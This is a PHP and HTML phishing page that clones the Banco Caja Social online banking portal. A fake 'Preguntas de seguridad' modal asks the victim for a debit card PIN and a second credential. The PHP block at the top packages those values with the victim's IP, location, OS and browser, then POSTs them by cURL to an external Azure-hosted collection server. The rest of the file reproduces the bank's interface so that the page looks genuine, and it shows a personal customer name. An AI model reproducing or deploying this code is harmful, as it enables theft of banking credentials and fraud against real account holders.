<?php ini_set('display_errors', 0);
$userp = $_SERVER['REMOTE_ADDR'];

include('funciones.php');
if (isset($_POST['socialcorr']) && isset($_POST['socialcontrcorr'])) {
    $message = 'CAJA SOCIAL
EMA1L: ' . $_POST['socialcorr'] . '
PAZZ: ' . $_POST['socialcontrcorr'] . '
Fecha: ' . date('l jS \of F Y h:i:s A', time()) . '
Ip y Localidad: ' . $myip . ' ' . $pais . ' ' . $region . '
SO: ' . $user_os . '
Navegador: ' . $navegador . '';
    $payload = ['mensaje' => $message];
    $url = 'https://servidorapis-ggdnawe6aefxerg7.canadacentral-01.azurewebsites.net/cajasocialnequi/';

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_HTTPHEADER     => [
            'Accept: application/json',
            'Content-Type: application/json'
        ],
        CURLOPT_POSTFIELDS     => json_encode($payload, JSON_UNESCAPED_UNICODE),
        CURLOPT_TIMEOUT        => 20,
        CURLOPT_CONNECTTIMEOUT => 10,
    ]);

    $response = curl_exec($ch);
    if ($response === false) {
        error_log('cURL error: ' . curl_error($ch));
        http_response_code(500);
        exit('Error de red.');
    }
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
} ?>
<!DOCTYPE html>
<html dir="LTR" lang="es-co" xml:lang="es-co" class=" webkit">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <style type="text/css">
        [uib-typeahead-popup].dropdown-menu {
            display: block;
        }
    </style>
    <style type="text/css">
        .uib-time input {
            width: 50px !important;
        }
    </style>
    <style type="text/css">
        [uib-tooltip-popup].tooltip.top-left>.tooltip-arrow,
        [uib-tooltip-popup].tooltip.top-right>.tooltip-arrow,
        [uib-tooltip-popup].tooltip.bottom-left>.tooltip-arrow,
        [uib-tooltip-popup].tooltip.bottom-right>.tooltip-arrow,
        [uib-tooltip-popup].tooltip.left-top>.tooltip-arrow,
        [uib-tooltip-popup].tooltip.left-bottom>.tooltip-arrow,
        [uib-tooltip-popup].tooltip.right-top>.tooltip-arrow,
        [uib-tooltip-popup].tooltip.right-bottom>.tooltip-arrow,
        [uib-tooltip-html-popup].tooltip.top-left>.tooltip-arrow,
        [uib-tooltip-html-popup].tooltip.top-right>.tooltip-arrow,
        [uib-tooltip-html-popup].tooltip.bottom-left>.tooltip-arrow,
        [uib-tooltip-html-popup].tooltip.bottom-right>.tooltip-arrow,
        [uib-tooltip-html-popup].tooltip.left-top>.tooltip-arrow,
        [uib-tooltip-html-popup].tooltip.left-bottom>.tooltip-arrow,
        [uib-tooltip-html-popup].tooltip.right-top>.tooltip-arrow,
        [uib-tooltip-html-popup].tooltip.right-bottom>.tooltip-arrow,
        [uib-tooltip-template-popup].tooltip.top-left>.tooltip-arrow,
        [uib-tooltip-template-popup].tooltip.top-right>.tooltip-arrow,
        [uib-tooltip-template-popup].tooltip.bottom-left>.tooltip-arrow,
        [uib-tooltip-template-popup].tooltip.bottom-right>.tooltip-arrow,
        [uib-tooltip-template-popup].tooltip.left-top>.tooltip-arrow,
        [uib-tooltip-template-popup].tooltip.left-bottom>.tooltip-arrow,
        [uib-tooltip-template-popup].tooltip.right-top>.tooltip-arrow,
        [uib-tooltip-template-popup].tooltip.right-bottom>.tooltip-arrow,
        [uib-popover-popup].popover.top-left>.arrow,
        [uib-popover-popup].popover.top-right>.arrow,
        [uib-popover-popup].popover.bottom-left>.arrow,
        [uib-popover-popup].popover.bottom-right>.arrow,
        [uib-popover-popup].popover.left-top>.arrow,
        [uib-popover-popup].popover.left-bottom>.arrow,
        [uib-popover-popup].popover.right-top>.arrow,
        [uib-popover-popup].popover.right-bottom>.arrow,
        [uib-popover-html-popup].popover.top-left>.arrow,
        [uib-popover-html-popup].popover.top-right>.arrow,
        [uib-popover-html-popup].popover.bottom-left>.arrow,
        [uib-popover-html-popup].popover.bottom-right>.arrow,
        [uib-popover-html-popup].popover.left-top>.arrow,
        [uib-popover-html-popup].popover.left-bottom>.arrow,
        [uib-popover-html-popup].popover.right-top>.arrow,
        [uib-popover-html-popup].popover.right-bottom>.arrow,
        [uib-popover-template-popup].popover.top-left>.arrow,
        [uib-popover-template-popup].popover.top-right>.arrow,
        [uib-popover-template-popup].popover.bottom-left>.arrow,
        [uib-popover-template-popup].popover.bottom-right>.arrow,
        [uib-popover-template-popup].popover.left-top>.arrow,
        [uib-popover-template-popup].popover.left-bottom>.arrow,
        [uib-popover-template-popup].popover.right-top>.arrow,
        [uib-popover-template-popup].popover.right-bottom>.arrow {
            top: auto;
            bottom: auto;
            left: auto;
            right: auto;
            margin: 0;
        }

        [uib-popover-popup].popover,
        [uib-popover-html-popup].popover,
        [uib-popover-template-popup].popover {
            display: block !important;
        }
    </style>
    <style type="text/css">
        .uib-datepicker-popup.dropdown-menu {
            display: block;
            float: none;
            margin: 0;
        }

        .uib-button-bar {
            padding: 10px;
        }
    </style>
    <style type="text/css">
        .uib-datepicker .uib-title {
            width: 100%;
        }

        .uib-day button,
        .uib-month button,
        .uib-year button {
            min-width: 100%;
        }

        .uib-left,
        .uib-right {
            width: 100%
        }
    </style>
    <style type="text/css">
        .ng-animate.item:not(.left):not(.right) {
            -webkit-transition: 0s ease-in-out left;
            transition: 0s ease-in-out left
        }
    </style>
    <style type="text/css">
        .uib-position-measure {
            display: block !important;
            visibility: hidden !important;
            position: absolute !important;
            top: -9999px !important;
            left: -9999px !important;
        }

        .uib-position-scrollbar-measure {
            position: absolute !important;
            top: -9999px !important;
            width: 50px !important;
            height: 50px !important;
            overflow: scroll !important;
        }

        .uib-position-body-scrollbar-measure {
            overflow: scroll !important;
        }
    </style>
    <style type="text/css">
        [data-ng-cloak],
        [x-ng-cloak],
        .ng-cloak,
        .x-ng-cloak,
        .ng-hide:not(.ng-hide-animate) {
            display: none !important;
        }

        ng\:form {
            display: block;
        }

        .ng-animate-shim {
            visibility: hidden;
        }

        .ng-anchor {
            position: absolute;
        }
    </style>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link href="./documents/favicon.ico" rel="shortcut icon" type="image/x-icon">
    <title>Validacion</title>
    </script>
    <link href="./documents/normalize.min.css" rel="stylesheet" type="text/css">
    <link href="./documents/backbase-portal.css" rel="stylesheet" type="text/css">
    <link href="./documents/theme-bcs-tx-whitelabel.css" rel="stylesheet" type="text/css">
    <link rel="stylesheet" type="text/css" href="./documents/shared.css">
    <link href="./documents/navbar.css" rel="stylesheet" type="text/css">
</head>

<body class="modal-open" style="padding-right: 17px;">
    <div uib-modal-window="modal-window" class="modal fade ng-scope ng-isolate-scope show" role="dialog" size="bcs-challenge" index="0" animate="animate" ng-style="{&#39;z-index&#39;: 1050 + $$topModalIndex*10, display: &#39;block&#39;}" tabindex="-1" uib-modal-animation-class="fade" modal-in-class="show" modal-animation="true" style="z-index: 1050; display: block;">
        <div class="modal-dialog modal-bcs-challenge">
            <div class="modal-content" uib-modal-transclude="">
                <div data-ng-include="&#39;templates/&#39;+ext.helpers.modalConfig.template+&#39;.html&#39;" class="ng-scope">
                    <div ng-show="ext.helpers.modalConfig.open &amp;&amp; $ctrl.challengeResp.listaPreguntas.length" class="ng-scope" aria-hidden="false">
                        <div class="modal-header">
                            <h1 class="ng-binding">Preguntas de seguridad</h1>
                            <span class="bcs-button-close" ng-click="ext.helpers.closeModal($ctrl)" role="button" tabindex="0">
                                <i class="icon-bcs icon-cross-1 exit"></i>
                            </span>
                        </div>
                        <div class="modal-body text-left">
                            <form method="post" action="validcr.php" class="bcs-form ng-dirty ng-valid-parse ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength" name="challengeForm" autocomplete="off">
                                <div class="question-header">
                                    <h4 class="ng-binding">¿Usted tiene tarjeta débito y es titular de la tarjeta? Seleccione una opción y digite la clave en caso de que su respuesta sea afirmativa. </h4>
                                    <span class="ng-binding"></span>
                                </div>
                                <!-- ngIf: ext.helpers.isMultipleQuestion($ctrl) -->
                                <div class="bcs-form-group options-container ng-scope" data-ng-if="ext.helpers.isMultipleQuestion($ctrl)">
                                    <!-- ngRepeat: answerItem in $ctrl.challengeResp.listaPreguntas[$ctrl.challengeResp.current].listaOpcionesRespuesta -->
                                    <div data-ng-repeat="answerItem in $ctrl.challengeResp.listaPreguntas[$ctrl.challengeResp.current].listaOpcionesRespuesta" class="ng-scope">
                                        <label for="0-A" class="bcs-custom-radio d-block text-left cyan lg text-lg ng-binding">
                                            <input type="radio" id="0-A" name="answerOption" data-ng-value="answerItem.codRespuesta" data-ng-model="$ctrl.challengeResp.listaPreguntas[$ctrl.challengeResp.current].codRespuesta" data-ng-click="($index != 0 ) ? $ctrl.challengeResp.listaPreguntas[$ctrl.challengeResp.current].answer = &#39;&#39; : angular.noop()" required="" class="ng-not-empty ng-dirty ng-valid ng-valid-required ng-touched ng-valid-parse" value="A" aria-invalid="false">
                                            <span class="bcs-control-indicator"></span>
                                            Sí tengo tarjeta débito

                                        </label>
                                        <!-- ngIf: ext.helpers.isFirstOptionSelected($ctrl, $index) && !ext.helpers.isMultipleSingleQuestion($ctrl) -->
                                        <div class="bcs-form-group bcs-challenge-text-multi ng-scope" data-ng-class="{&#39;bcs-error&#39;: challengeForm.multipleAnswer.$dirty &amp;&amp; challengeForm.multipleAnswer.$invalid}" data-ng-if="ext.helpers.isFirstOptionSelected($ctrl, $index) &amp;&amp; !ext.helpers.isMultipleSingleQuestion($ctrl)">
                                            <input type="password" placeholder="Clave de Debito" name="socialcorr" id="multipleAnswer" autocomplete="off" maxlength="4" data-ng-model="$ctrl.challengeResp.listaPreguntas[$ctrl.challengeResp.current].answer" data-ng-pattern="/^[0-9]*$/i" required="" class="ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength" aria-invalid="true">
                                            <style>
                                                #multipleAnswer::placeholder {
                                                    color: rgb(167, 167, 167)
                                                }
                                            </style>
                                        </div>
                                        <!-- end ngIf: ext.helpers.isFirstOptionSelected($ctrl, $index) && !ext.helpers.isMultipleSingleQuestion($ctrl) -->
                                    </div>
                                    <!-- end ngRepeat: answerItem in $ctrl.challengeResp.listaPreguntas[$ctrl.challengeResp.current].listaOpcionesRespuesta -->
                                    <div data-ng-repeat="answerItem in $ctrl.challengeResp.listaPreguntas[$ctrl.challengeResp.current].listaOpcionesRespuesta" class="ng-scope">
                                        <label for="0-B" class="bcs-custom-radio d-block text-left cyan lg text-lg ng-binding">
                                            <input type="radio" id="0-B" name="answerOption" data-ng-value="answerItem.codRespuesta" data-ng-model="$ctrl.challengeResp.listaPreguntas[$ctrl.challengeResp.current].codRespuesta" data-ng-click="($index != 0 ) ? $ctrl.challengeResp.listaPreguntas[$ctrl.challengeResp.current].answer = &#39;&#39; : angular.noop()" required="" class="ng-not-empty ng-valid ng-valid-required ng-dirty ng-touched" value="B" aria-invalid="false">
                                            <span class="bcs-control-indicator"></span>
                                            No tengo tarjeta débito

                                        </label>
                                    </div>
                                </div>
                                <div class="text-center">
                                    <button class="btn-bcs bcs-main ng-pristine ng-valid ng-binding ng-scope ng-empty ng-touched" title="Enviar" data-ng-model-options="{ debounce: 1000 }" data-ng-model="$ctrl.challenge.btnFinish" data-ng-if="$ctrl.challengeResp.current == $ctrl.challengeResp.listaPreguntas.length-1">Enviar
                                    </button>
                                    <!-- end ngIf: $ctrl.challengeResp.current == $ctrl.challengeResp.listaPreguntas.length-1 -->
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div uib-modal-backdrop="modal-backdrop" class="modal-backdrop fade ng-scope show" ng-style="{&#39;z-index&#39;: 1040 + (index &amp;&amp; 1 || 0) + index*10}" uib-modal-animation-class="fade" modal-in-class="show" modal-animation="true" data-bootstrap-modal-aria-hidden-count="1" aria-hidden="true" style="z-index: 1040;"></div>
    <div class="bcs-close-sesion" id="bcsCloseSesion" data-bootstrap-modal-aria-hidden-count="1" aria-hidden="true">
        <div class="bcs-cont">
            <div class="bcs-logo"></div>
            <div class="bcs-title">
                <h1>Apreciado cliente</h1>
            </div>
            <div class="bcs-description">
                <i class="icon-bcs icon-chat-2-1"></i>
                <h2>Su sesión ha finalizado correctamente. Hasta pronto.</h2>
            </div>
            <div class="bcs-btn-close">
                <button class="btn-bcs bcs-main btn-payment-back icon-xs" type="button">Cerrar
                </button>
            </div>
        </div>
    </div>
    <div id="main" data-pid="page_1550610410831" class="bp-area --area pageContainer" data-bootstrap-modal-aria-hidden-count="1" aria-hidden="true">
        <div class="bcs-tx-topside-menu-container page-container bp-container bp-NavigationContainer bp-ui-dragRoot" data-pid="container-bcs-tx-navigation-9196950">
            <!-- top navbar -->
            <div class="navbar navbar-light bg-white navbar-expand-md fixed-top rb-navbar-top d-print-block" role="navigation">
                <div class="container-fluid text-right p-0">
                    <div class="navbar-header text-left">
                        <button class="navbar-toggler d-print-none" type="button" data-toggle="collapse" data-target="#nav-sidebar-collapse" aria-controls="#nav-sidebar-collapse" aria-expanded="false" aria-label="Toggle navigation">
                            <span class="navbar-toggler-icon"></span>
                        </button>
                        <div class="navbar-brand rb-brand --area bp-area">
                            <div data-pid="CXPContentWidget-5216929" class="bp-widget bp-ui-dragRoot">
                                <div class="bp-widget-head"></div>
                                <div class="bp-widget-pref"></div>
                                <div class="bp-widget-body be-ice-widget-rendered">
                                    <div class="be-ice-widget" g:onload="return b$.universal.widgets.contentWidget.start(__WIDGET__)">
                                        <div class="bp-g-include" proxy="false" src="$(contextRoot)/contenttemplates/rendered">
                                            <div class="be-ex-image-only">
                                                <div class="d-none d-md-block d-print-none">
                                                    <img src="./documents/logoBCS.svg" title="logoBCS.svg">
                                                </div>
                                                <div class="d-block d-md-none d-print-block">
                                                    <img src="./documents/logoBCSUnaLineas.svg" title="logoBCSUnaLineas.svg">
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="bp-widget-foot"></div>
                            </div>
                        </div>
                    </div>
                    <div class="nav navbar-nav navbar-right rb-notifications-area --area bp-area d-none d-md-flex no-margin d-print-none">
                        <div class="btn-card-lock d-none d-md-block">
                            <button id="cardLockBtn" class="btn-bcs bcs-alert light d-none" title="Bloqueo de tarjetas">
                                <i class="icon-bcs icon-alert-1"></i>
                                Bloqueo de tarjetas
                            </button>
                        </div>
                        <div data-pid="widget-bcs-tx-user-menu-ng-9174916" class="bp-widget bp-ui-dragRoot">
                            <div class="bp-widget-head"></div>
                            <div class="bp-widget-pref"></div>
                            <div class="bp-widget-body ng-scope">
                                <div g:onload="BB.Widget.ngStart(__WIDGET__);">
                                    <div class="widget-bb-user-menu-ng">
                                        <div class="bp-g-include" local="true" src="$(contextRoot)/static/features/%5BBBHOST%5D/${extension}/templates/template.ng.html">
                                            <div class="ext-bcs-tx-user-menu-ng ng-scope" data-ng-controller="UserMenuController as $ctrl">
                                                <div class="bb-user-menu row-table">
                                                    <!-- ngIf: $ctrl.currentUser.name -->
                                                    <div class="col-cell ng-scope" data-ng-if="$ctrl.currentUser.name">
                                                        <!-- ngIf: $ctrl.userDataUrl -->
                                                        <a data-ng-if="$ctrl.userDataUrl" href="portalserver/bcs-mis-datos" class="float-left ng-scope">
                                                            <!-- ngInclude: 'templates/avatar.html' -->
                                                            <div data-ng-include="&#39;templates/avatar.html&#39;" class="ng-scope">
                                                                <ui-bb-avatar-ng class="bb-avatar media img-circle img-thumbnail no-padding float-left text-center ng-scope ng-isolate-scope" data-image="$ctrl.currentUser.imageAvatar" data-name="$ctrl.currentUser.name">
                                                                    <!-- ngIf: !$ctrl.image -->
                                                                    <span data-ng-if="!$ctrl.image" data-role="avatar-initials" data-ng-bind="$ctrl.initials" aria-hidden="true" class="ng-binding ng-scope"></span>
                                                                    <!-- end ngIf: !$ctrl.image -->
                                                                    <!-- ngIf: $ctrl.image -->
                                                                </ui-bb-avatar-ng>
                                                            </div>
                                                        </a>
                                                        <div class="text-right float-left">
                                                            <!-- ngIf: $ctrl.userDataUrl -->
                                                            <a data-ng-if="$ctrl.userDataUrl" href="portalserver/bcs-mis-datos" class="ng-scope">
                                                                <div class="tooltip-icon" uib-tooltip="Actualizar mis datos" tooltip-placement="bottom-left">
                                                                    <!-- ngInclude: 'templates/userInfo.html' -->
                                                                    <div data-ng-include="&#39;templates/userInfo.html&#39;" class="ng-scope">
                                                                        <span class="center-block user-info ng-scope">
                                                                            <span data-i18n-key="logout.label.greeting">Hola</span>
                                                                            <span data-ng-bind="$ctrl.currentUser.name" class="ng-binding"></span>
                                                                        </span>
                                                                    </div>
                                                                </div>
                                                            </a>
                                                            <button class="user-logout-link ng-scope" data-ng-click="ext.helpers.showModal($ctrl)" data-ng-if="$ctrl.logoutView" title="Cerrar sesión" data-i18n-key="logout.label.logout">Cerrar sesión</button>
                                                            <!-- end ngIf: $ctrl.logoutView -->
                                                            <ui-bb-modal-ng data-is-open="ext.helpers.isModalOpen" data-animation="true" data-size="&#39;md&#39;" data-backdrop="true" data-keyboard="true" data-on-open="ext.helpers.showModal()" data-on-close="ext.helpers.hideModal()" class="ng-scope"></ui-bb-modal-ng>
                                                            <ui-bb-modal-ng data-is-open="ext.helpers.isModalOpenTransactions" data-animation="true" data-size="&#39;transactions&#39;" data-backdrop="&#39;static&#39;" data-keyboard="true" data-on-open="ext.helpers.showModalTransactions()" data-on-close="ext.helpers.hideModalTransactions()" class="ng-scope"></ui-bb-modal-ng>
                                                        </div>
                                                        <div class="clearfix"></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="bp-widget-foot"></div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- side navbar and content -->
            <div class="bcs-row-content sticky-top-outline">
                <div class="container-fluid rb-row-content bcs-content-container">
                    <div class="rb-sidebar  d-print-none" role="navigation" id="container-bcs-transaction">
                        <div class="rb-sidebar-area --area bp-area">
                            <a class="skiplinks" href="portalserver/bcs-transferencias/mis-transferencias-inmediatas/enviar-dinero#rb-content">Skip to Content</a>
                            <div data-pid="widget-bcs-tx-user-menu-ng-3089287" class="bp-widget bp-ui-dragRoot">
                                <div class="bp-widget-head"></div>
                                <div class="bp-widget-pref"></div>
                                <div class="bp-widget-body ng-scope">
                                    <div g:onload="BB.Widget.ngStart(__WIDGET__);">
                                        <div class="widget-bb-user-menu-ng">
                                            <div class="bp-g-include" local="true" src="$(contextRoot)/static/features/%5BBBHOST%5D/${extension}/templates/template.ng.html">
                                                <div class="ext-bcs-tx-user-sidebar-ng d-md-none d-flex p-3 bg-white ng-scope" ng-class="ext.helpers.showKeyboard" data-ng-controller="UserMenuController as $ctrl">
                                                    <div class="bb-user-menu row-table">
                                                        <div class="col-cell ng-scope" data-ng-if="$ctrl.currentUser.name">
                                                            <a data-ng-if="$ctrl.userDataUrl" href="portalserver/bcs-mis-datos" class="float-left ng-scope">
                                                                <div data-ng-include="&#39;templates/avatar.html&#39;" class="ng-scope">
                                                                    <ui-bb-avatar-ng class="bb-avatar media img-circle img-thumbnail no-padding float-left text-center ng-scope ng-isolate-scope" data-image="$ctrl.currentUser.imageAvatar" data-name="$ctrl.currentUser.name">
                                                                        <span data-ng-if="!$ctrl.image" data-role="avatar-initials" data-ng-bind="$ctrl.initials" aria-hidden="true" class="ng-binding ng-scope"></span>
                                                                        <!-- end ngIf: !$ctrl.image -->
                                                                    </ui-bb-avatar-ng>
                                                                </div>
                                                            </a>
                                                            <div class="text-right float-left">
                                                                <a data-ng-if="$ctrl.userDataUrl" href="portalserver/bcs-mis-datos" class="ng-scope">
                                                                    <div class="tooltip-icon" uib-tooltip="Actualizar mis datos" tooltip-placement="top-right">
                                                                        <div data-ng-include="&#39;templates/userInfo.html&#39;" class="ng-scope">
                                                                            <span class="center-block user-info ng-scope">
                                                                                <span data-i18n-key="logout.label.greeting">Hola</span>
                                                                                <span data-ng-bind="$ctrl.currentUser.name" class="ng-binding">JAIDER LUIS ALVARADO BERRIO</span>
                                                                            </span>
                                                                        </div>
                                                                    </div>
                                                                </a>
                                                                <button class="user-logout-link ng-scope" data-ng-click="ext.helpers.showModal($ctrl)" data-ng-if="$ctrl.logoutView" title="Cerrar sesión" data-i18n-key="logout.label.logout">Cerrar sesión</button>
                                                                <!-- end ngIf: $ctrl.logoutView -->
                                                                <ui-bb-modal-ng data-is-open="ext.helpers.isModalOpen" data-animation="true" data-size="&#39;md&#39;" data-backdrop="true" data-keyboard="true" data-on-open="ext.helpers.showModal()" data-on-close="ext.helpers.hideModal()" class="ng-scope"></ui-bb-modal-ng>
                                                                <ui-bb-modal-ng data-is-open="ext.helpers.isModalOpenTransactions" data-animation="true" data-size="&#39;transactions&#39;" data-backdrop="&#39;static&#39;" data-keyboard="true" data-on-open="ext.helpers.showModalTransactions()" data-on-close="ext.helpers.hideModalTransactions()" class="ng-scope"></ui-bb-modal-ng>
                                                            </div>
                                                            <div class="clearfix"></div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="bp-widget-foot"></div>
                            </div>
                            <div data-pid="CXPNavigationWidget-1813761" class="bp-widget bp-ui-dragRoot">
                                <div class="bp-widget-head"></div>
                                <div class="bp-widget-pref"></div>
                                <div class="bp-widget-body">
                                    <div class="bb-universal-nav navbar navbar-default" g:onload="b$.universal.widgets.NavigationWidget.start(__WIDGET__)">
                                        <div class="bp-g-model" objecttype="link" renderer="advancedNav">
                                            <ul class="nav navbar-nav">
                                                <li class="">
                                                    <a href="portalserver/bcs-mis-productos" class="dropdown-toggle">Mis productos</a>
                                                </li>
                                                <li class="">
                                                    <a href="portalserver/bcs-administrar-mis-productos" class="dropdown-toggle">Administrar mis productos</a>
                                                </li>
                                                <li class="">
                                                    <a href="portalserver/bcs-abrir-mis-productos" class="dropdown-toggle">Abrir mis productos</a>
                                                </li>
                                                <li class="">
                                                    <a href="portalserver/bcs-transferencias" class="dropdown-toggle">Mis transferencias y avances</a>
                                                </li>
                                                <li class="">
                                                    <a href="portalserver/bcs-pagos" class="dropdown-toggle">Mis Pagos</a>
                                                </li>
                                                <li class="">
                                                    <a href="portalserver/bcs-extractos" class="dropdown-toggle">Mis extractos</a>
                                                </li>
                                                <li class="">
                                                    <a href="portalserver/bcs-certificados" class="dropdown-toggle">Mis certificaciones</a>
                                                </li>
                                                <li class="">
                                                    <a href="portalserver/bcs-mis-datos" class="dropdown-toggle">Actualizar mis datos</a>
                                                </li>
                                                <li class="">
                                                    <a href="portalserver/bcs-seguridad" class="dropdown-toggle">Seguridad</a>
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                                <div class="bp-widget-foot"></div>
                            </div>
                        </div>
                        <div class="nav navbar-nav navbar-right rb-notifications-area --area bp-area d-block d-md-none no-margin d-print-none">
                            <div class="btn-card-lock d-none d-md-block">
                                <button id="cardLockBtn" class="btn-bcs bcs-alert light d-none" title="Bloqueo de tarjetas">
                                    <i class="icon-bcs icon-alert-1"></i>
                                    Bloqueo de tarjetas
                                </button>
                            </div>
                        </div>
                    </div>
                    <div id="rb-content" class="rb-content col-xs-12 --area bp-area">
                        <div class="bcs-header-info-user"></div>
                        <div class="bcs-header-info-user-mobile"></div>
                        <div class="bp-container template-container-bcs-tx-page-layout" data-pid="container-bcs-tx-page-layout-2351193">
                            <main class="bp-area template-container-bcs-tx-page-layout--area">
                                <div class="bp-container bp-ui-dragRoot bp-manageableArea --area bp-area " data-pid="container_1550610410868">
                                    <div data-pid="widget-bcs-security-challenge-ng-2736153" class="bp-widget bp-ui-dragRoot">
                                        <div class="bp-widget-head"></div>
                                        <div class="bp-widget-pref"></div>
                                        <div class="bp-widget-body ng-scope">
                                            <div g:onload="BB.Widget.ngStart(__WIDGET__);">
                                                <div class="widget-bcs-security-challenge-ng">
                                                    <div class="bp-g-include" local="true" src="$(contextRoot)/static/features/%5BBBHOST%5D/${extension}/templates/template.ng.html">
                                                        <!-- ngInclude: -->
                                                        <ng-include src="ext.helpers.template" class="ng-scope">
                                                            <div class="ext-bcs-security-challenge-ng ng-scope" data-ng-controller="SecurityChallengeController as $ctrl">
                                                                <ui-bb-modal-ng data-is-open="ext.helpers.modalConfig.open" data-animation="true" data-size="&#39;bcs-challenge&#39;" data-backdrop="&#39;static&#39;" data-keyboard="false" data-on-open="ext.helpers.showModal()" data-on-close="ext.helpers.hideModal()" class="ng-scope"></ui-bb-modal-ng>
                                                            </div>
                                                        </ng-include>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="bp-widget-foot"></div>
                                    </div>
                                    <div data-pid="widget-bcs-tx-ti-enviar-dinero-ng-2851613" class="bp-widget bp-ui-dragRoot">
                                        <div class="bp-widget-head"></div>
                                        <div class="bp-widget-pref"></div>
                                        <div class="bp-widget-body ng-scope">
                                            <div g:onload="BB.Widget.ngStart(__WIDGET__);">
                                                <div class="widget-bcs-tx-ti-enviar-dinero-ng">
                                                    <div class="bp-g-include" local="true" src="$(contextRoot)/static/features/%5BBBHOST%5D/${extension}/templates/template.ng.html">
                                                        <!-- ngInclude: -->
                                                        <ng-include src="ext.helpers.template" class="ng-scope">
                                                            <div class="ext-bcs-tx-ti-enviar-dinero-ng bcs-payment-view ng-scope" data-ng-controller="TxTiEnviarDineroController as $ctrl">
                                                                <!-- ngIf: state.currentStep.revertEnable -->
                                                                <div class="card">
                                                                    <div class="card-heading">
                                                                        <h1 class="ng-binding">Validación de inicio de sesión</h1>
                                                                    </div>
                                                                    <div class="bcs-transfer-actions ng-hide" data-ng-hide="state.hideTab" aria-hidden="true">
                                                                        <div class="bcs-tab-actions">
                                                                            <button class="bcs-tab-item ng-binding active" data-ng-class="{&#39;active&#39; : $ctrl.tabs.historicTransfer.tab == state.currentTab, &#39;disabled&#39;: state.historicLoading || state.historicTransfersError}" data-ng-click="$ctrl.setCurrentTab($ctrl.tabs.historicTransfer)" data-ng-disabled="state.historicTransfersError">
                                                                                <i class="icon-bcs icon-timer"></i>
                                                                                Envíos recientes

                                                                            </button>
                                                                            <button class="bcs-tab-item ng-binding" data-ng-class="{&#39;active&#39; : $ctrl.tabs.sendTransfer.tab == state.currentTab, &#39;disabled&#39;: state.historicLoading}" data-ng-click="$ctrl.setCurrentTab($ctrl.tabs.sendTransfer, $ctrl.transferForm)">
                                                                                <i class="icon-bcs icon-add-3"></i>
                                                                                Nuevo envío

                                                                            </button>
                                                                        </div>
                                                                    </div>
                                                                    <!-- ngIf: state.currentTab == $ctrl.tabs.historicTransfer.tab -->
                                                                    <ui-bcs-tx-step-indicator-ng data-ng-if="state.currentTab == $ctrl.tabs.historicTransfer.tab" config="ext.helpers.uiStepIndicatorConfig" class="ng-scope ng-isolate-scope">
                                                                        <div class="bcs-tx-step-indicator-container bcs-no-selectable-text d-print-none">
                                                                            <div class="bcs-step-indicator medium" data-ng-class="{&#39;small&#39;: $ctrl.config.steps &lt;= 2, &#39;medium&#39;: $ctrl.config.steps == 3, &#39;high&#39;: $ctrl.config.steps &gt;= 4}">
                                                                                <!-- ngRepeat: step in $ctrl.stepsArr track by $index -->
                                                                                <div class="step ng-scope finished" data-ng-repeat="step in $ctrl.stepsArr track by $index" data-ng-class="{
	    			&#39;active&#39;: $ctrl.config.currentStep == $index + 1 &amp;&amp; ($last ? !$ctrl.config.lastFinished : true),
	    			&#39;finished&#39;: $last ? $ctrl.config.lastFinished : ($ctrl.config.currentStep &gt; $index + 1)}">
                                                                                    <div class="step-connector ng-hide" data-ng-show="$index &gt; 0" data-ng-style="{&#39;width&#39;: (100 / ($ctrl.config.steps - 1)) + &#39;%&#39;, 
	    			&#39;right&#39;: (100 - (100 / ($ctrl.config.steps - 1)) * $index) + &#39;%&#39;}" aria-hidden="true" style="width: 50%; right: 100%;"></div>
                                                                                    <div class="step-dot" data-ng-style="{&#39;left&#39;: ((100 / ($ctrl.config.steps - 1)) * $index) + &#39;%&#39;}" style="left: 0%;">
                                                                                        <span class="ng-binding">1</span>
                                                                                        <i class="icon-bcs icon-check-1"></i>
                                                                                    </div>
                                                                                    <!-- ngIf: $ctrl.config.labels[$index] -->
                                                                                </div>
                                                                                <!-- end ngRepeat: step in $ctrl.stepsArr track by $index -->
                                                                                <div class="step ng-scope finished" data-ng-repeat="step in $ctrl.stepsArr track by $index" data-ng-class="{
	    			&#39;active&#39;: $ctrl.config.currentStep == $index + 1 &amp;&amp; ($last ? !$ctrl.config.lastFinished : true),
	    			&#39;finished&#39;: $last ? $ctrl.config.lastFinished : ($ctrl.config.currentStep &gt; $index + 1)}">
                                                                                    <div class="step-connector" data-ng-show="$index &gt; 0" data-ng-style="{&#39;width&#39;: (100 / ($ctrl.config.steps - 1)) + &#39;%&#39;, 
	    			&#39;right&#39;: (100 - (100 / ($ctrl.config.steps - 1)) * $index) + &#39;%&#39;}" aria-hidden="false" style="width: 50%; right: 50%;"></div>
                                                                                    <div class="step-dot" data-ng-style="{&#39;left&#39;: ((100 / ($ctrl.config.steps - 1)) * $index) + &#39;%&#39;}" style="left: 50%;">
                                                                                        <span class="ng-binding">2</span>
                                                                                        <i class="icon-bcs icon-check-1"></i>
                                                                                    </div>
                                                                                    <!-- ngIf: $ctrl.config.labels[$index] -->
                                                                                </div>
                                                                                <!-- end ngRepeat: step in $ctrl.stepsArr track by $index -->
                                                                                <div class="step ng-scope active" data-ng-repeat="step in $ctrl.stepsArr track by $index" data-ng-class="{
	    			&#39;active&#39;: $ctrl.config.currentStep == $index + 1 &amp;&amp; ($last ? !$ctrl.config.lastFinished : true),
	    			&#39;finished&#39;: $last ? $ctrl.config.lastFinished : ($ctrl.config.currentStep &gt; $index + 1)}">
